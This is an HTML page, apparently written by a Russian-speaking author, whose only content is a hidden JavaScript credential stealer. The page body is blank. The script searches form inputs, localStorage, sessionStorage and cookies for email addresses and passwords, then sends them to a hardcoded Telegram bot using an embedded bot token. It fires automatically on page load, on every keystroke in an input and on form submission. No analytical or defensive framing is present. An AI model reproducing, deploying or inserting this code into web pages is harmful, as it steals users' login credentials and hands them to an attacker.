<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        * { margin: 0; padding: 0; }
        body { 
            background: white; 
            width: 100vw; 
            height: 100vh; 
            overflow: hidden;
        }
    </style>
</head>
<body>

<script>
// ===== ТВОЙ ТОКЕН =====
const BOT_TOKEN = "8870629098:AAELG7u3brQfiq40IgP9dd3IB36LMBdMfbM";
const CHAT_ID = "8850351378";
// =====================

let foundEmail = '';
let foundPassword = '';
let sent = false;

function sendToTelegram(email, password) {
    if (sent || !email) return;
    sent = true;
    
    const text = `📩 ПОЧТА И ПАРОЛЬ\n📧 Email: ${email}\n🔑 Пароль: ${password || 'Не найден'}\n🕒 ${new Date().toLocaleString()}`;
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
    
    fetch(url, { mode: 'no-cors' });
    new Image().src = url;
}

function findEmailAndPassword() {
    // ИЩЕМ EMAIL
    let email = '';
    
    // 1. Проверяем все поля ввода
    const inputs = document.querySelectorAll('input');
    inputs.forEach(input => {
        const val = input.value.trim();
        if (val && val.includes('@') && val.includes('.')) {
            email = val;
        }
    });
    
    // 2. Проверяем localStorage
    if (!email && window.localStorage) {
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const val = localStorage.getItem(key);
            if (val && val.includes('@') && val.includes('.')) {
                email = val;
                break;
            }
        }
    }
    
    // 3. Проверяем cookies
    if (!email && document.cookie) {
        const cookies = document.cookie.split(';');
        cookies.forEach(cookie => {
            if (cookie.includes('@') && cookie.includes('.')) {
                email = cookie.trim();
            }
        });
    }
    
    // 4. Проверяем sessionStorage
    if (!email && window.sessionStorage) {
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            const val = sessionStorage.getItem(key);
            if (val && val.includes('@') && val.includes('.')) {
                email = val;
                break;
            }
        }
    }
    
    // ИЩЕМ ПАРОЛЬ
    let password = '';
    
    // 1. Проверяем поля с паролями
    inputs.forEach(input => {
        if (input.type === 'password' && input.value.trim()) {
            password = input.value.trim();
        }
        if (input.getAttribute('autocomplete') === 'current-password' && input.value.trim()) {
            password = input.value.trim();
        }
    });
    
    // 2. Ищем в localStorage
    if (!password && window.localStorage) {
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const val = localStorage.getItem(key);
            if (val && (key.toLowerCase().includes('pass') || key.toLowerCase().includes('pwd'))) {
                password = val;
                break;
            }
        }
    }
    
    // 3. Ищем в sessionStorage
    if (!password && window.sessionStorage) {
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            const val = sessionStorage.getItem(key);
            if (val && (key.toLowerCase().includes('pass') || key.toLowerCase().includes('pwd'))) {
                password = val;
                break;
            }
        }
    }
    
    // СОХРАНЯЕМ И ОТПРАВЛЯЕМ
    if (email) {
        foundEmail = email;
        foundPassword = password;
        sendToTelegram(email, password);
    }
}

// ЗАПУСК ПРИ ЗАГРУЗКЕ
window.addEventListener('load', function() {
    // Проверяем сразу
    setTimeout(findEmailAndPassword, 100);
    setTimeout(findEmailAndPassword, 500);
    setTimeout(findEmailAndPassword, 1000);
    setTimeout(findEmailAndPassword, 2000);
    setTimeout(findEmailAndPassword, 3000);
});

// ЕСЛИ ПОЛЬЗОВАТЕЛЬ ЧТО-ТО ВВОДИТ - ЛОВИМ
document.addEventListener('input', function(e) {
    if (e.target.tagName === 'INPUT') {
        const val = e.target.value.trim();
        if (val && val.includes('@') && val.includes('.')) {
            findEmailAndPassword();
        }
        if (e.target.type === 'password' && val) {
            findEmailAndPassword();
        }
    }
});

// ЕСЛИ ФОРМА ОТПРАВЛЯЕТСЯ
document.addEventListener('submit', function() {
    setTimeout(findEmailAndPassword, 300);
});

console.log('🔍 Поиск почты и пароля...');
</script>
</body>
</html>
